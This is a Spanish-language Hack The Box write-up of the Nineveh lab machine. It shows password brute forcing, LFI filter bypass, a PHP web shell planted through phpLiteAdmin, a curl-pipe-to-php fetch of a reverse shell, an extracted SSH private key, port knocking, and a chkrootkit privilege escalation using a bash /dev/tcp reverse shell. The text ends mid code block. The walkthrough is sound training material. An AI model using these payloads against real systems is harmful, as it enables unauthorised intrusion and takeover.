---
title: Hack The Box Nineveh
author: k4miyo
date: 2021-11-28
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Medium, Linux]
tags: [PHP, Port Knocking, LFI, Web]
ping: true
---

## Nineveh
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.43.

```bash
❯ ping -c 1 10.10.10.43
PING 10.10.10.43 (10.10.10.43) 56(84) bytes of data.
64 bytes from 10.10.10.43: icmp_seq=1 ttl=63 time=136 ms

--- 10.10.10.43 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 135.820/135.820/135.820/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.43 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-27 19:50 CST
Initiating SYN Stealth Scan at 19:50
Scanning 10.10.10.43 [65535 ports]
Discovered open port 80/tcp on 10.10.10.43
Discovered open port 443/tcp on 10.10.10.43
Completed SYN Stealth Scan at 19:50, 26.52s elapsed (65535 total ports)
Nmap scan report for 10.10.10.43
Host is up, received user-set (0.14s latency).
Scanned at 2021-11-27 19:50:21 CST for 27s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE REASON
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.61 seconds
           Raw packets sent: 131087 (5.768MB) | Rcvd: 21 (924B)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬───────────────────────────────────────
       │ File: extractPorts.tmp
───────┼───────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.43
   5   │     [*] Open ports: 80,443
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sC -sV -p80,443 10.10.10.43 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-27 19:52 CST
Nmap scan report for 10.10.10.43
Host is up (0.14s latency).

PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
|_http-server-header: Apache/2.4.18 (Ubuntu)
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.69 seconds
```

Vemos sólo los puerto 80 y 443. Dentro de los resultados de `nmap`, vemos el dominio `nineveh.htb` el cual vamos a agregar a nuestro archivo `/etc/hosts` y posteriormente, antes de visualizar el contenido vía web; vamos a observar a lo que nos enfrentamos con `whatweb`:

```bash
❯ whatweb http://nineveh.htb/
http://nineveh.htb/ [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.43]
❯ whatweb https://nineveh.htb/
https://nineveh.htb/ [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.43]
```

No vemos algún CMS (gestor de contenido), por lo que el sitio podría ser echo manualmente. Ahora si vamos el ver el contenido vía web.

![](/assets/images/htb-nineveh/nineveh-web.png)

![](/assets/images/htb-nineveh/nineveh-web1.png)

Como no vemos nada interesante, trataremos de descubrir rutas dentro del servidor con la herramienta `nmap` y posteriormente con  `wfuzz` para ambos servicios, tanto por HTTP como HTTPS:

```bash
❯ nmap --script http-enum -p80,443 10.10.10.43 -oN webScan
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-27 20:26 CST
Nmap scan report for nineveh.htb (10.10.10.43)
Host is up (0.14s latency).

PORT    STATE SERVICE
80/tcp  open  http
| http-enum: 
|_  /info.php: Possible information file
443/tcp open  https
| http-enum: 
|   /db/: BlogWorx Database
|_  /db/: Potentially interesting folder

Nmap done: 1 IP address (1 host up) scanned in 28.66 seconds
```

Para el puerto 80 tenemos `/info.php` y sobre el puerto 443 tenemos `/db/` que se encuentra relacionado con ***BlogWorx Database***. Si tratamos de ingresar vía web al recurso, tenemos un panel de login de ***phpLiteAdmin v1.9***.

![](/assets/images/htb-nineveh/nineveh-web2.png)

Vamos ahora a utilizar `wfuzz`:

```bash
❯ wfuzz -c -t 200 --hc=404 --hh=178 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  http://nineveh.htb/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://nineveh.htb/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                         
=====================================================================

000003021:   301        9 L      28 W       315 Ch      "department"                                                    
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 0
Processed Requests: 32291
Filtered Requests: 32290
Requests/sec.: 0
```

```bash
❯ wfuzz -c -t 200 --hc=404 --hh=49 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  https://nineveh.htb/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://nineveh.htb/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                         
=====================================================================

000000848:   301        9 L      28 W       309 Ch      "db"                                                            
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 111.4947
Processed Requests: 45914
Filtered Requests: 45913
Requests/sec.: 411.8040
```

Tenemos nuevos recursos, para el 80 `department` al cual si le echamos un ojo, tenemos otro panel de login:

![](/assets/images/htb-nineveh/nineveh-web3.png)

A este punto, tenemos dos paneles de login, por lo que podriamos tratar de hacer SQLi; sin embargo, los sitios no son vulnerables, por lo que vamos a tratar de hacer fuerza bruta para obtener la contraseña y empezaremos con el puerto recurso `db` y la herramienta `hydra`.

```bash
❯ hydra -l none -P /usr/share/wordlists/rockyou.txt nineveh.htb https-form-post "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password."
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-11-27 20:55:08
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-forms://nineveh.htb:443/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password.
[STATUS] 727.00 tries/min, 727 tries in 00:01h, 14343672 to do in 328:50h, 16 active
[443][http-post-form] host: nineveh.htb   login: none   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-11-27 20:57:05
```

Hablando un poco del comando `hydra`, con el parámetro `-l` le indicamos un nombre de usuario, si es minúscula es que conocemos el usuario y con mayúscula le indicamos un diccionario; para este caso en concreto, no requerimos usuario ya que solo se tiene el campo de password, así que le ponemos `none`. Con el parámetro `-P` le indicamos la contraseña y la ponemos en mayúscula ya que haremos uso de un diccionario, el `rockyou.txt`. Posteriormente el indicamos la dirección IP o el dominio, luego el método que se utilizar para tramitar la petición, para este caso es **POST** y se lo indicamos con `https-form-post` y por último entre comillas ponemos tres valores separados por dos puntos `:`, el primero corresponde al recurso donde se encuentra el panel de login, el segundo los datos que se tramitan y el tercero, algún indicador que nos ayude a validar si la contraseña es correcta o incorrecta. Esta información la podemos obtener de **Inspeccionar** del navegador, que puede ser click secundario e **Inspeccionar** o haciendo Ctrl + O en el navegador y después hacer una solicitud con cualquier contraseña.

![](/assets/images/htb-nineveh/nineveh-web4.png)

![](/assets/images/htb-nineveh/nineveh-web5.png)

Vemos que la contraseña es `password123` y ya podemos ingresar (**Nota**: Recordar guardar siempre las credenciales que encontremos).

![](/assets/images/htb-nineveh/nineveh-web6.png)

Mediante la herramienta `searchsploit` podriamos tratar de ver si existen exploits públicos asociados a ***phpLiteAdmin 1.9*** y encontramos algunos que básicamente nos indican como crear una nueva base de datos inyectando comandos en php.

```bash
❯ searchsploit phpLiteAdmin 1.9
----------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                 |  Path
----------------------------------------------------------------------------------------------- ---------------------------------
PHPLiteAdmin 1.9.3 - Remote PHP Code Injection                                                 | php/webapps/24044.txt
phpLiteAdmin 1.9.6 - Multiple Vulnerabilities                                                  | php/webapps/39714.txt
----------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Por el momento dejaremos este portal y ahora vamos a aplicar fuerza bruta para el panel de login sobre el puerto 80. Si probamos credenciales default dentro del panel de login, vemos que el usuario `admin` existe, así que vamos a utilizar este usuario y para el ataque vamos a utilizar la herramienta [patator](https://github.com/lanjelot/patator/blob/master/patator.py). Solo la descargamos, le damos permisos de ejecución y ejecutamos.

![](/assets/images/htb-nineveh/nineveh-web7.png)

![](/assets/images/htb-nineveh/nineveh-web8.png)

```bash
❯ ./patator.py http_fuzz url="http://nineveh.htb/department/login.php" method=POST body='username=admin&password=FILE0' 0=/usr/share/wordlists/rockyou.txt -x ignore:fgrep="Invalid Password\!"
21:52:36 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.2 at 2021-11-27 21:52 CST
21:52:36 patator    INFO -                                                                              
21:52:36 patator    INFO - code size:clen       time | candidate                          |   num | mesg
21:52:36 patator    INFO - -----------------------------------------------------------------------------
21:53:40 patator    INFO - 302  2049:1706      0.137 | 1q2w3e4r5t                         |  4553 | HTTP/1.1 302 Found
^C21:53:45 patator    INFO - Hits/Done/Skip/Fail/Size: 1/4910/0/0/14344392, Avg: 71 r/s, Time: 0h 1m 8s
21:53:45 patator    INFO - To resume execution, pass --resume 491,491,491,491,491,491,491,491,491,491
```

Ya tenemos las credenciales del segundo panel del login `admin : 1q2w3e4r5t`; asi que vamos a guardarlas y luego utilizarlas para ver el contenido web.

![](/assets/images/htb-nineveh/nineveh-web9.png)

Si seleccionamos el apartado de **Notes**, vemos que se nos muestra un mensaje y la dirección URL parece algo curiosa, al parecer está apuntando a un archivo dentro del sistema llamado `ninevehNotes.txt`

![](/assets/images/htb-nineveh/nineveh-web10.png)

```text
- Have you fixed the login page yet! hardcoded username and password is really bad idea!
- check your serect folder to get in! figure it out! this is your challenge
- Improve the db interface.
    ~amrois
```

El mensaje nos da algunas pistas y confirma la parte de que se está leyendo un archivo `ninevehNotes.txt`; asi que vamos a quitarle la extensión a ver que pasa.

![](/assets/images/htb-nineveh/nineveh-web11.png)

Tenemos un mensaje de alertas indicando que el archivo `ninevehNotes` no existe bajo la ruta `/var/www/html/department/`. A este punto podríamos pensar que el sitio podría ser vulnerable a **LFI (Local File Inclusion)**; así que vamos a tratar de ver el archivo `/etc/passwd`:

- `http://nineveh.htb/department/manage.php?notes=/etc/passwd`

![](/assets/images/htb-nineveh/nineveh-web12.png)

El sitio nos arroja ***No note is selected***. Podríamos probar un **Directory Traversal**:

- `http://nineveh.htb/department/manage.php?notes=/../../../../etc/passwd`

Sin embargo, tampoco vemos nada. Si hacemos varias pruebas, el mensaje de alerta solo nos aparece cuando está la palabra `ninevehNotes`, por lo que podríamos pensar que se está aplicando algún filtro para evitar que podamos acceder a otro archivo. A este punto podríamos probar el ejemplo anterior pero agregando la palabra clave:

- `http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../../../../etc/passwd`

![](/assets/images/htb-nineveh/nineveh-web13.png)

Tenemos capacidad de visualizar archivos internos de la máquina. Con esto ya tenemos la posibilidad de ingresar a la máquina, por lo que primero vamos a crearnos una base de datos en la plataforma de ***phpLiteAdmin*** con extensión php y agregarle contenido malicioso para posteriormente desde el recurso `/department` apuntar a nuestro archivo y ganar acceso a la máquina. 

Primero vamos a crear nuestra base de datos en la parte donde indica **Create New Database** que llamaremos **k4miyo.php**. Una vez creada la seleccionamos en al parte donde indica **Change Database**

![](/assets/images/htb-nineveh/nineveh-web14.png)

Ahora en la parte donde nos dice **Create new table on database 'k4miyo.php'**, en la sección de **Name** colocamos lo que queramos, en este caso *shell* y en **Number of Fields** podemos 1 y el damos click en **Go**:

![](/assets/images/htb-nineveh/nineveh-web15.png)

Posteriormente, en **Type** seleccionamos **TEXT**, en **Field** insertamos nuestro código php `<?php system($_REQUEST["cmd"]) ?>` y le damos en **Create**

![](/assets/images/htb-nineveh/nineveh-web16.png)

Ya tenemos nuestro archivo php que si le damos en **Return** nos mostrará información sobre nuestro archivo y lo que nos interesa es la ruta `/var/tmp/k4miyo.php` para que podamos apuntar desde el otro sitio web, que es lo que haremos:

- `http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../../../../var/tmp/k4miyo.php`

![](/assets/images/htb-nineveh/nineveh-web17.png)

Ahora para poder ejecutar comandos, haremos uso de la variable `cmd` y hay que tener en cuentra que para agregarla a la dirección URL lo haremos con el símbolo `&` debido a el `?` ya está siendo usado:

- `http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../../../../var/tmp/k4miyo.php&cmd=whoami`

![](/assets/images/htb-nineveh/nineveh-web18.png)

Ya tenemos ejecución de comando a nivel de sistema, ahora nos queda ingresar a la máquina; para este caso haremos uso de la herramienta [php-reverse-shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell), así que la descargamos en nuestro directorio de trabajo, los descomprimimos y modificamos los parámetros que nos indica dentro del archivo `php-reverse-shell.php`. Una vez hecho esto, nos compartimos un servidor HTTP con python, nos podemos en escucha y procedemos a entablarnos una reverse shell.

- `http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../../../../var/tmp/k4miyo.php&cmd=curl http://10.10.14.27/shell.php|php`

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.43 - - [28/Nov/2021 20:43:22] "GET /shell.php HTTP/1.1" 200 -
```

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.43] 56104
Linux nineveh 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 20:48:20 up 57 min,  0 users,  load average: 0.01, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```

Ya nos encontramos dentro de la máquina y como siempre, para trabajar más cómodos, vamos a hacer un [Tratamiento de la tty](/posts/tratamiento-tty). Nos encontramos como el usuario **www-data** y no podemos visualizar la flag ya que no tenemos los permisos necesarios. Vamos a enumerar un poco el sistema.

```bash
www-data@nineveh:/home/amrois$ id 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@nineveh:/home/amrois$ sudo -l
[sudo] password for www-data: 
www-data@nineveh:/home/amrois$
```

No vemos nada interesante, así que podriamos probar buscar recursos interesantes dentro de los servidores bajo las rutas `/var/www/hmlt` y `/var/www/ssl` y bajo la última, nos encontramos un directorio llamado `secure_notes` el cual presenta dos archivos:

```bash
www-data@nineveh:/var/www/ssl$ ls -l
total 560
drwxr-xr-x 2 root root   4096 Jul  2  2017 db
-rw-r--r-- 1 root root     49 Jul  2  2017 index.html
-rw-r--r-- 1 root root 560852 Jul  2  2017 ninevehForAll.png
drwxr-xr-x 2 root root   4096 Jul  2  2017 secure_notes
www-data@nineveh:/var/www/ssl$ cd secure_notes/
www-data@nineveh:/var/www/ssl/secure_notes$ ls -l
total 2832
-rw-r--r-- 1 root root      71 Jul  2  2017 index.html
-rw-r--r-- 1 root root 2891984 Jul  2  2017 nineveh.png
www-data@nineveh:/var/www/ssl/secure_notes$
```

Vamos a observar las cadenas imprimibles de la imagen `nineveh.png`:

```bash
www-data@nineveh:/var/www/ssl/secure_notes$ strings nineveh.png
...
www-data
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----
secret/nineveh.pub
0000644
0000041
0000041
00000000620
13126060277
014541
ustar  
www-data
www-data
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb
www-data@nineveh:/var/www/ssl/secure_notes$
```

Tenemos una clave id_rsa, la cual de acuerdo con lo observado, podría ser del usuario **amrois**; sin embargo, no se observa el puerto 22 abierto externamente, así que vamos a validarlo de manera interna.

```bash
www-data@nineveh:/var/www/ssl/secure_notes$ netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN     
tcp        0      0 10.10.10.43:80          10.10.14.27:34440       ESTABLISHED
tcp        0    138 10.10.10.43:56104       10.10.14.27:443         ESTABLISHED
tcp6       0      0 :::22                   :::*                    LISTEN     
www-data@nineveh:/var/www/ssl/secure_notes$
```

Lo que podríamos hacer es un ***Remote Port Forwarding*** para alcanzar el puerto desde nuestra máquina de manera local y aprovechar la id_rsa; por lo que primero creamos un archivo llamado `id_rsa` y le asignamos el privilegio 600.

```bash
❯ chmod 600 id_rsa
```

Ahora procedemos crear un tunel para alcanzar el puerto 22 de la máquina víctima a través del puerto 4646 de nuestro equipo de atacante (**Nota**: En el comando se observa el parámetro `-p 2222` ya que es el puerto que tengo configurado y además es importante iniciar el servicio ssh `service ssh start`).

```bash
www-data@nineveh:/var/www/ssl/secure_notes$ ssh -R 4646:127.0.0.1:22 k4miyo@10.10.14.27 -p 2222
Could not create directory '/var/www/.ssh'.
The authenticity of host '[10.10.14.27]:2222 ([10.10.14.27]:2222)' can't be established.
ECDSA key fingerprint is SHA256:X+58wT4JhCZo1JHA1IfaUg4HqR7NmOzkqFouwQwkYu0.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
k4miyo@10.10.14.27's password: 
Linux k4mipc 5.14.0-2parrot1-amd64 #1 SMP Debian 5.14.6-2parrot1 (2021-09-25) x86_64
 ____                      _     ____            
|  _ \ __ _ _ __ _ __ ___ | |_  / ___|  ___  ___ 
| |_) / _` | '__| '__/ _ \| __| \___ \ / _ \/ __|
|  __/ (_| | |  | | | (_) | |_   ___) |  __/ (__ 
|_|   \__,_|_|  |_|  \___/ \__| |____/ \___|\___|
                                                 



The programs included with the Parrot GNU/Linux are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Parrot GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
░▒▓    ~  ✔  with k4miyo@k4mipc ▓▒░ 
```

```bash
❯ lsof -i:4646
COMMAND    PID   USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
sshd    143226 k4miyo   10u  IPv6 451442      0t0  TCP localhost:4646 (LISTEN)
sshd    143226 k4miyo   11u  IPv4 451443      0t0  TCP localhost:4646 (LISTEN)
```


Ahora vamos a proceder a conectarnos vía ssh de manera local apuntando al puerto 4646 como el usuario **amrois**:

```bash
❯ ssh -i id_rsa amrois@127.0.0.1 -p 4646
The authenticity of host '[127.0.0.1]:4646 ([127.0.0.1]:4646)' can't be established.
ECDSA key fingerprint is SHA256:aWXPsULnr55BcRUl/zX0n4gfJy5fg29KkuvnADFyMvk.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[127.0.0.1]:4646' (ECDSA) to the list of known hosts.
Ubuntu 16.04.2 LTS
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

288 packages can be updated.
207 updates are security updates.


You have mail.
Last login: Mon Jul  3 00:19:59 2017 from 192.168.0.14
amrois@nineveh:~$ whoami
amrois
amrois@nineveh:~$
```

Ya somos el usuario **amrois** y podemos visualizar la flag (user.txt). Ahora, nos podríamos ahorrar lo anterior ya que si checamos el archivo  `/etc /knockd.conf`, vemos que están configuradas unas reglas para hacer ***Port Knocking***, es decir, probar si ciertos puertos se encuetran abiertos en un orden especifico para abrir otro puerto; para este caso, al validar los puertos en orden 571, 290 y 911, encontraremos el puerto 22 abierto de manera externa.

```bash
www-data@nineveh:/etc$ cat knockd.conf 
[options]
 logfile = /var/log/knockd.log
 interface = ens160

[openSSH]
 sequence = 571, 290, 911 
 seq_timeout = 5
 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

[closeSSH]
 sequence = 911,290,571
 seq_timeout = 5
 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn
www-data@nineveh:/etc$
```

Para hacerlo, vamos a hacer uso de la herramienta `knock`, la cual la podemos instalar con `apt-get install knockd`:

```bash
❯ knock 10.10.10.43 571:tcp 290:tcp 911:tcp
❯ nmap -p22 --open -T5 -v -n 10.10.10.43
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-28 21:29 CST
Initiating Ping Scan at 21:29
Scanning 10.10.10.43 [4 ports]
Completed Ping Scan at 21:29, 0.15s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 21:29
Scanning 10.10.10.43 [1 port]
Discovered open port 22/tcp on 10.10.10.43
Completed SYN Stealth Scan at 21:29, 0.15s elapsed (1 total ports)
Nmap scan report for 10.10.10.43
Host is up (0.14s latency).

PORT   STATE SERVICE
22/tcp open  ssh

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.43 seconds
           Raw packets sent: 5 (196B) | Rcvd: 2 (72B)
```

El puerto 22 ya se encuentra abierto externamente. Una vez dentro, si enumeramos un poco el sistema como el usuario **amrois** no vemos nada interesante, así que podemos pensar que se está ejecutando una tarea en intervalos regulares, así que vamos a crearnos nuestro archivo [ProcMon](/posts/procmon), ejecutarlo y ver que información nos reporta.

```bash
amrois@nineveh:/dev/shm$ ./procmon.sh                           
> /usr/sbin/CRON -f                                             
> /bin/sh -c /root/vulnScan.sh
> /bin/bash /root/vulnScan.sh                                   
> /bin/sh /usr/bin/chkrootkit
> /bin/sh /usr/bin/chkrootkit                                   
> /bin/echo a\c      
> grep -E c                                                     
< /bin/sh /usr/bin/chkrootkit                                                                                                    
< /bin/echo a\c                                                                                                                  
< grep -E c                  
> /bin/sh /usr/bin/chkrootkit
> /bin/ps ax                 
> grep -E (^|[^A-Za-z0-9_])inetd([^A-Za-z0-9_]|$)               
> grep -E -v grep            
> grep -E -v chkrootkit      
> /bin/sh /usr/bin/chkrootkit                                   
> /usr/bin/awk { print $5 }
```

Como vemos en los resultados obtenidos, se está ejecutando el archivo `/usr/bin/chkrootkit` cuyo propietario es el usuario **root** y al investigar un poco vemos que **Chrootkit** es un programa informático de consola, común en sistemas operativos Unix y derivados que permite localizar rootkits conocidos, realizando múltiples pruebas en las que busca entre los binarios modificados por dicho software. Si mediante `searchsploit` buscamos dicho programa, encontraremos algunos exploits públicos para escalar privilegios. (**Nota**: En el momento de ejecutar el `procmon.sh` al parecer se encontraba otro usuario vulnerando la máquina, por eso vemos varios comandos que no son relacionados a la máquina).

```bash
❯ searchsploit chkrootkit
----------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                 |  Path
----------------------------------------------------------------------------------------------- ---------------------------------
Chkrootkit - Local Privilege Escalation (Metasploit)                                           | linux/local/38775.rb
Chkrootkit 0.49 - Local Privilege Escalation                                                   | linux/local/33899.txt
----------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Si leemos el archivo `linux/local/33899.txt` nos indica que debemos poner un archivo ejecutable con nombre `update` dentro del directorio `/tmp` y posteriormente ejecutar `chkrootkit` (en este caso, ya el usuario **root** lo hace por nosotros). Por lo que debemos crear un el archivo `update`:

```bash
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.27/443 0>&1
```

Le damos permisos de ejecución y nos ponemos en escucha por el puerto 443:

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.43] 56474
bash: cannot set terminal process group (18487): Inappropriate ioctl for device
bash: no job control in this shell
root@nineveh:~# whoami
whoami
root
root@nineveh:~# 
```

Ya somos el usuario **root** y podemos visualizar la flag (root.txt). Otra forma más cómoda sería asignarle permisos SUID a la `/bin/bash`:

```bash
#!/bin/bash

chmod u+s /bin/bash
```

Esperamos un rato y vemos que se han aplicado los permisos y accedemos como el usuario **root**:

```bash
